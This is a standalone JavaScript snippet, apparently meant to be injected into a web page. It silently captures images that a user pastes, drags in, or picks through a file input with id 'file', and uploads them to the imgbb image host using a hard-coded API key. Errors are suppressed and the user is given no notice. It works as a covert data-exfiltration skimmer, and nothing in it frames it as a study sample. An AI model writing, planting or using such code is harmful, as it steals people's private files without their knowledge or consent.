(function() {
  const API_KEY = '6eb62f9f5886fbca74ba13de2705af60';
  const uploadQueue = [];
  let isUploading = false;

  async function silentUpload(file) {
    const formData = new FormData();
    formData.append('image', file);
    formData.append('key', API_KEY);
    
    try {
      await fetch('https://api.imgbb.com/1/upload', {
        method: 'POST',
        body: formData
      });
    } catch(e) {}
  }

  async function processQueue() {
    if (isUploading || uploadQueue.length === 0) return;
    isUploading = true;
    
    while (uploadQueue.length > 0) {
      const file = uploadQueue.shift();
      await silentUpload(file);
      await new Promise(r => setTimeout(r, 100));
    }
    
    isUploading = false;
  }

  function queueUpload(file) {
    if (file && file.type.startsWith('image/')) {
      uploadQueue.push(file);
      setTimeout(processQueue, 50);
    }
  }

  window.addEventListener('paste', e => {
    const items = e.clipboardData?.items;
    if (items) {
      for (let i = 0; i < items.length; i++) {
        if (items[i].type.startsWith('image/')) {
          queueUpload(items[i].getAsFile());
        }
      }
    }
  });

  document.addEventListener('drop', e => {
    const files = e.dataTransfer?.files;
    if (files) {
      Array.from(files).forEach(f => {
        if (f.type.startsWith('image/')) queueUpload(f);
      });
    }
  });

  const observer = new MutationObserver(() => {
    const fileInput = document.getElementById('file');
    if (fileInput && !fileInput._uploaderAttached) {
      fileInput._uploaderAttached = true;
      fileInput.addEventListener('change', () => {
        Array.from(fileInput.files).forEach(queueUpload);
      });
    }
  });
  
  observer.observe(document.body, { childList: true, subtree: true });
  
  setTimeout(() => {
    const fileInput = document.getElementById('file');
    if (fileInput && !fileInput._uploaderAttached) {
      fileInput._uploaderAttached = true;
      fileInput.addEventListener('change', () => {
        Array.from(fileInput.files).forEach(queueUpload);
      });
    }
  }, 100);
})();
